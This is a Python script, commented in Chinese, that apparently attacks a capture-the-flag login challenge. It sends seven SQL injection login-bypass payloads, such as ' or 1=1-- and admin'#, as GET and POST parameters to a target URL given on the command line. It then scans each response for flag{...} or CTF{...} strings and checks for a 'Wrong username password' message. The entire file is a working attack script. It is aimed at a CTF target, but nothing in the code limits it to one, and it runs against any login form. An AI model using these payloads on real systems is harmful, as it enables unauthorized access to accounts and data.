#!/usr/bin/env python3
"""
测试flag检测
"""

import asyncio
import aiohttp
import re
import sys

async def test_payloads(url):
    """测试各种payload"""
    async with aiohttp.ClientSession() as session:
        payloads = [
            {"username": "admin'--", "password": ""},
            {"username": "admin'#", "password": ""},
            {"username": "admin' or 1=1#", "password": ""},
            {"username": "' or 1=1--", "password": ""},
            {"username": "' or '1'='1", "password": ""},
            {"username": "admin", "password": "' or 1=1--"},
            {"username": "admin", "password": "' or '1'='1"},
        ]
        
        for i, payload in enumerate(payloads):
            print(f"\n{'='*60}")
            print(f"测试Payload {i+1}: {payload}")
            
            # GET请求
            try:
                async with session.get(url, params=payload, timeout=10) as response:
                    text = await response.text()
                    print(f"GET 状态码: {response.status}")
                    print(f"GET 响应长度: {len(text)}")
                    
                    # 检查flag
                    flag_patterns = [
                        r'flag\{[^}]+\}',
                        r'FLAG\{[^}]+\}',
                        r'ctf\{[^}]+\}',
                        r'CTF\{[^}]+\}',
                    ]
                    
                    for pattern in flag_patterns:
                        match = re.search(pattern, text)
                        if match:
                            print(f"🎉 找到flag: {match.group()}")
                            return match.group()
                    
                    # 如果没有flag，显示响应内容
                    if "NO,Wrong username password" in text:
                        print("响应包含: 'NO,Wrong username password'")
                    else:
                        print("响应不包含错误消息，可能成功!")
                        print(f"响应预览: {text[:500]}")
            except Exception as e:
                print(f"GET请求错误: {e}")
            
            # POST请求
            try:
                async with session.post(url, data=payload, timeout=10) as response:
                    text = await response.text()
                    print(f"POST 状态码: {response.status}")
                    print(f"POST 响应长度: {len(text)}")
                    
                    for pattern in flag_patterns:
                        match = re.search(pattern, text)
                        if match:
                            print(f"🎉 找到flag: {match.group()}")
                            return match.group()
                    
                    if "NO,Wrong username password" in text:
                        print("响应包含: 'NO,Wrong username password'")
                    else:
                        print("响应不包含错误消息，可能成功!")
                        print(f"响应预览: {text[:500]}")
            except Exception as e:
                print(f"POST请求错误: {e}")
    
    return None

async def main():
    if len(sys.argv) < 2:
        print("用法: python test_flag_detection.py <URL>")
        return
    
    url = sys.argv[1]
    print(f"测试目标: {url}")
    
    flag = await test_payloads(url)
    
    if flag:
        print(f"\n{'='*60}")
        print(f"✅ 成功找到flag: {flag}")
    else:
        print(f"\n{'='*60}")
        print("❌ 未找到flag")

if __name__ == "__main__":
    asyncio.run(main())